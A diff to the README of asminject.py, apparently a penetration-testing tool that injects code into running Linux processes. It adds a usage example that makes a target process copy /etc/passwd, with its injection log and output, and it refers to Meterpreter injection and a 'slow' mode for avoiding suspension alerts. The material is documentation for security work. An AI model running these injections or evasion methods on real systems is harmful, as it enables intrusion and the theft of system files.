@@ -194,7 +194,7 @@ In a third terminal, locate the process and inject the Meterpreter payload into 
 root     2144475  0.0  0.1  10644  5172 pts/2    S+   15:44   0:00 sudo python2 ./calling_script.py
 root     2144476  0.5  0.2  13884  8088 pts/2    S+   15:44   0:00 python2 ./calling_script.py
 
-# python3 ./asminject.py 2144476 /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/lmrt11443 --pause --precompiled
+# python3 ./asminject.py 2144476 asminject/lmrt11443 --pause --precompiled
 
 ...omitted for brevity...
 [*] Writing assembled binary to /tmp/tmp78ods3rv.o
@@ -221,6 +221,40 @@ Meterpreter  : x64/linux
 
 ```
 
+## Create a copy of a file using buffered read/write libc calls
+
+If you don't mind making library calls, writing custom code is much easier. This example uses code that (like the first example) creates a copy of a file, but by using libc's fopen(), fread(), fwrite(), and fclose() instead of syscalls, can easily use a buffered approach that's more efficient.
+
+```
+# python3 ./asminject.py 1544597 asm/x86-64/copy_file_using_libc.s --var sourcefile "/etc/passwd" --var destfile "/tmp/copied_using_libc.txt" --stop-method "slow" --relative-offsets asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --pause false --stage-mode mem
+
+...omitted for brevity...
+[*] RSP is 0x00007ffd39d25208
+[*] Value at RSP is 0x00005568364980b4
+[*] MMAP'd block is 0x00000001368bd209
+[*] Wrote first stage shellcode at 00007f1f121331c6 in target process 1544597
+[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.[0-9]+.so$' in assembly code
+[*] Writing assembled binary to /tmp/tmp0zvbe4b3.o
+[*] RSP is 0x00007ffd39d25168
+[*] Value at RSP is 0x0000000000000000
+[*] MMAP'd block is 0x00007f1f12279000
+[*] Writing stage 2 to 0x00007f1f12279000 in target memory
+[*] Writing 0x01 to 0x00007ffd39d25168 in target memory to indicate OK
+[*] Stage 2 proceeding
+...omitted for brevity...
+[+] Done!
+
+# cat /tmp/copied_using_libc.txt
+
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+...omitted for brevity...
+```
+
+
 # Features
 
 ## Using "slow" mode to help avoid triggering alerts related to process suspension
@@ -237,7 +271,7 @@ Meterpreter  : x64/linux
 *asminject.py* adds a fourth option: increasing the priority of its own process and decreasing the priority of the target process. This "slow" mode generally allows it to act like [Quicksilver in _X-Men: Days of Future Past_](https://youtu.be/T9GFyZ5LREQ?t=32), making its changes to the target process at lightning speed. The target process is still running, but so slowly relative to *asminject.py* that it may as well be suspended.
 
 ```
-# python3 ./asminject.py 1470158 /mnt/hgfs/c/Users/blincoln/Documents/GitHub/asminject/asm/x86-64/execute_python_code-01.s --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-bin-python2.7-2021-08-30.txt --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');"  --stop-method "slow" --pause false
+# python3 ./asminject.py 1470158 asm/x86-64/execute_python_code-01.s --relative-offsets asminject/relative_offsets-copyroom-usr-bin-python2.7-2021-08-30.txt --relative-offsets asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');"  --stop-method "slow" --pause false
 
 ...omitted for brevity...
 [*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
@@ -269,7 +303,7 @@ Some binaries are compiled without the position-independent code build option (i
 As the message indicates, this type of binary can be manually flagged using one or more *--non-pic-binary* options, which are parsed as regular expressions. e.g.:
 
 ```
-# python3 ./asminject.py 1470214 /mnt/hgfs/c/Users/blincoln/Documents/GitHub/asminject/asm/x86-64/execute_python_code-01.s --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-bin-python3.9-2021-08-30.txt --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');" --non-pic-binary "/usr/bin/python3\\.[0-9]+" --stop-method "slow" --pause false
+# python3 ./asminject.py 1470214 asm/x86-64/execute_python_code-01.s --relative-offsets asminject/relative_offsets-copyroom-usr-bin-python3.9-2021-08-30.txt --relative-offsets asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');" --non-pic-binary "/usr/bin/python3\\.[0-9]+" --stop-method "slow" --pause false
 
 ...omitted for brevity...
 [*] Handling '/usr/bin/python3.9' as non-PIC binary
@@ -330,6 +364,10 @@ As the message indicates, this type of binary can be manually flagged using one 
 ```
 
 ### Version history
+
+#### 0.5 (2021-08-31)
+
+- Added copy-file-using-libc code
 
 #### 0.4 (2021-08-31)
 
